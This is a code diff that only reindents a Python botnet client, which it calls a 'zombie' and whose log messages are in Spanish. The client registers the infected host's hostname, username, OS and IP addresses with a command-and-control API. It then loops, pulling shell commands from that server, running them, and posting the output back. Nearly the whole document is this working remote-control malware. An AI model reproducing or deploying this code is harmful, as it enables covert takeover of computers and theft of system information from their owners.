@@ -27,249 +27,249 @@ TIME_BEFORE_DELETE_COMMAND = 1
 
 class Bot:
 
-	def __init__(self):
+    def __init__(self):
 
-		# Bot data
+        # Bot data
 
-		self._uuid = None
-		self._hostname = None
-		self._username = None
-		self._os = None
-		self._remote_ip = None
-		self._local_ip = None
-		self._state = None
-		self._location = None
+        self._uuid = None
+        self._hostname = None
+        self._username = None
+        self._os = None
+        self._remote_ip = None
+        self._local_ip = None
+        self._state = None
+        self._location = None
 
-	@property
-	def uuid(self):
-		return self._uuid
+    @property
+    def uuid(self):
+        return self._uuid
 
-	@uuid.setter
-	def uuid(self, uuid):
-		self._uuid = uuid
+    @uuid.setter
+    def uuid(self, uuid):
+        self._uuid = uuid
 
-	@property
-	def hostname(self):
-		return self._hostname
+    @property
+    def hostname(self):
+        return self._hostname
 
-	@hostname.setter
-	def hostname(self, hostname):
-		self._hostname = hostname
+    @hostname.setter
+    def hostname(self, hostname):
+        self._hostname = hostname
 
-	@property
-	def username(self):
-		return self._username
+    @property
+    def username(self):
+        return self._username
 
-	@username.setter
-	def username(self, username):
-		self._username = username
+    @username.setter
+    def username(self, username):
+        self._username = username
 
-	@property
-	def os(self):
-		return self._os
+    @property
+    def os(self):
+        return self._os
 
-	@os.setter
-	def os(self, os):
-		self._os = os
+    @os.setter
+    def os(self, os):
+        self._os = os
 
-	@property
-	def remote_ip(self):
-		return self._remote_ip
+    @property
+    def remote_ip(self):
+        return self._remote_ip
 
-	@uuid.setter
-	def remote_ip(self, remote_ip):
-		self._remote_ip = remote_ip
+    @uuid.setter
+    def remote_ip(self, remote_ip):
+        self._remote_ip = remote_ip
 
-	@property
-	def local_ip(self):
-		return self._local_ip
+    @property
+    def local_ip(self):
+        return self._local_ip
 
-	@local_ip.setter
-	def local_ip(self, local_ip):
-		self._local_ip = local_ip
+    @local_ip.setter
+    def local_ip(self, local_ip):
+        self._local_ip = local_ip
 
-	@property
-	def state(self):
-		return self._state
+    @property
+    def state(self):
+        return self._state
 
-	@state.setter
-	def state(self, state):
-		self._state = state
+    @state.setter
+    def state(self, state):
+        self._state = state
 
-	@property
-	def location(self):
-		return self._location
+    @property
+    def location(self):
+        return self._location
 
-	@location.setter
-	def location(self, location):
-		self._location = location
+    @location.setter
+    def location(self, location):
+        self._location = location
 
-	# ----------- Connection Methods -----------
+    # ----------- Connection Methods -----------
 
-	def create_connection(self, data):
+    def create_connection(self, data):
 
-		headers = {'Content-type': 'application/json'}
+        headers = {'Content-type': 'application/json'}
 
-		response = requests.post(f"{URL_API_BOT}", data=json.dumps(data), headers=headers).json()
-		
-		return response["success"]
+        response = requests.post(f"{URL_API_BOT}", data=json.dumps(data), headers=headers).json()
+        
+        return response["success"]
 
-	def update_connection(self, data):
+    def update_connection(self, data):
 
-		headers = {'Content-type': 'application/json'}
+        headers = {'Content-type': 'application/json'}
 
-		response = requests.put(f"{URL_API_BOT}/{self._uuid}", data=json.dumps(data), headers=headers).json()
+        response = requests.put(f"{URL_API_BOT}/{self._uuid}", data=json.dumps(data), headers=headers).json()
 
-		return response["success"]
+        return response["success"]
 
-	# ----------- Commands Methods -----------
+    # ----------- Commands Methods -----------
 
-	def get_command(self):
+    def get_command(self):
 
-		response = requests.get(f"{URL_API_BOT}/{self._uuid}/command").json()
+        response = requests.get(f"{URL_API_BOT}/{self._uuid}/command").json()
 
-		if response:
+        if response:
 
-			return response["line"]
+            return response["line"]
 
-	def send_output(self, output):
+    def send_output(self, output):
 
-		headers = {'Content-type': 'application/json'}
+        headers = {'Content-type': 'application/json'}
 
-		payload = { "output": output }
+        payload = { "output": output }
 
-		response = requests.put(f"{URL_API_BOT}/{self._uuid}/command", data=json.dumps(payload), headers=headers).json()
+        response = requests.put(f"{URL_API_BOT}/{self._uuid}/command", data=json.dumps(payload), headers=headers).json()
 
-		return response["success"]
+        return response["success"]
 
-	def delete_command(self):
+    def delete_command(self):
 
-		response = requests.delete(f"{URL_API_BOT}/{self._uuid}/command").json()
+        response = requests.delete(f"{URL_API_BOT}/{self._uuid}/command").json()
 
-		return response["success"]	
+        return response["success"]  
 
 
 def load_data(zombie):
 
-	zombie.uuid = tools_data.get_uuid()
-	zombie.hostname = tools_data.get_hostname()
-	zombie.username = tools_data.get_username()
-	zombie.os = tools_data.get_platform()
-	zombie.remote_ip = tools_data.get_remote_ip()
-	zombie.local_ip = tools_data.get_local_ip()
-	zombie.state = "Online"
-	zombie.location = "Argentina"
+    zombie.uuid = tools_data.get_uuid()
+    zombie.hostname = tools_data.get_hostname()
+    zombie.username = tools_data.get_username()
+    zombie.os = tools_data.get_platform()
+    zombie.remote_ip = tools_data.get_remote_ip()
+    zombie.local_ip = tools_data.get_local_ip()
+    zombie.state = "Online"
+    zombie.location = "Argentina"
 
 def build_payload(zombie):
 
-	return {
+    return {
 
-		"uuid": zombie.uuid,
-		"hostname": zombie.hostname,
-		"username": zombie.username,
-		"os": zombie.os,
-		"remote_ip": zombie.remote_ip,
-		"local_ip": zombie.local_ip,
-		"state": zombie.state,
-		"location": zombie.location
+        "uuid": zombie.uuid,
+        "hostname": zombie.hostname,
+        "username": zombie.username,
+        "os": zombie.os,
+        "remote_ip": zombie.remote_ip,
+        "local_ip": zombie.local_ip,
+        "state": zombie.state,
+        "location": zombie.location
 
-	}
+    }
 
 
 if __name__ == '__main__':
-	
-	zombie = Bot()
+    
+    zombie = Bot()
 
-	active_zombie = True
+    active_zombie = True
 
-	try:
+    try:
 
-		while active_zombie:
+        while active_zombie:
 
-			try:
+            try:
 
-				load_data(zombie)
+                load_data(zombie)
 
-				payload = build_payload(zombie)
+                payload = build_payload(zombie)
 
-				if not zombie.create_connection(payload):
+                if not zombie.create_connection(payload):
 
-					if DEBUG:
+                    if DEBUG:
 
-						logger.log("Zombie ya existe. Se actualizará la información...", "warning")
+                        logger.log("Zombie ya existe. Se actualizará la información...", "warning")
 
-					if zombie.update_connection(payload):
+                    if zombie.update_connection(payload):
 
-						if DEBUG:
+                        if DEBUG:
 
-							logger.log("Información actualizada", "success")
+                            logger.log("Información actualizada", "success")
 
-					else:
+                    else:
 
-						if DEBUG:
+                        if DEBUG:
 
-							logger.log("Información no se pudo actualizar", "error")
+                            logger.log("Información no se pudo actualizar", "error")
 
-					cmdline = zombie.get_command()
+                    cmdline = zombie.get_command()
 
-					if cmdline:
+                    if cmdline:
 
-						if DEBUG:
+                        if DEBUG:
 
-							logger.log(f"Ejecutando comando: {cmdline}", "processing")
+                            logger.log(f"Ejecutando comando: {cmdline}", "processing")
 
-						output = ""
+                        output = ""
 
-						if cmdline == "exit":
+                        if cmdline == "exit":
 
-							output += "exit"
+                            output += "exit"
 
-							active_zombie = False
+                            active_zombie = False
 
-						else:
+                        else:
 
-							output += cmd.get_output(cmdline)
+                            output += cmd.get_output(cmdline)
 
-						if zombie.send_output(output):
+                        if zombie.send_output(output):
 
-							if DEBUG:
+                            if DEBUG:
 
-								logger.log("Salida enviada con éxito", "success")
+                                logger.log("Salida enviada con éxito", "success")
 
-						else:
+                        else:
 
-							if DEBUG:
-								
-								logger.log("No se ha podido enviar la salida", "error")
+                            if DEBUG:
+                                
+                                logger.log("No se ha podido enviar la salida", "error")
 
-						time.sleep(TIME_BEFORE_DELETE_COMMAND)
+                        time.sleep(TIME_BEFORE_DELETE_COMMAND)
 
-						if zombie.delete_command():
+                        if zombie.delete_command():
 
-							if DEBUG:
+                            if DEBUG:
 
-								logger.log("Último comando borrado con éxito", "success")
+                                logger.log("Último comando borrado con éxito", "success")
 
-						else:
+                        else:
 
-							if DEBUG:
-								
-								logger.log("No se ha podido borrar el comando", "error")
+                            if DEBUG:
+                                
+                                logger.log("No se ha podido borrar el comando", "error")
 
-				else:
+                else:
 
-					if DEBUG:
+                    if DEBUG:
 
-						logger.log("Zombie creado con éxito", "success")
+                        logger.log("Zombie creado con éxito", "success")
 
-			except requests.exceptions.ConnectionError as error:
+            except requests.exceptions.ConnectionError as error:
 
-				print("Ha ocurrido un error en el servidor de C&C, intentando reconectar...")
+                print("Ha ocurrido un error en el servidor de C&C, intentando reconectar...")
 
-				time.sleep(TIME_RECONNECT)
+                time.sleep(TIME_RECONNECT)
 
 
 
-	except KeyboardInterrupt as error:
+    except KeyboardInterrupt as error:
 
-		print("Ha salido del zombie")
+        print("Ha salido del zombie")
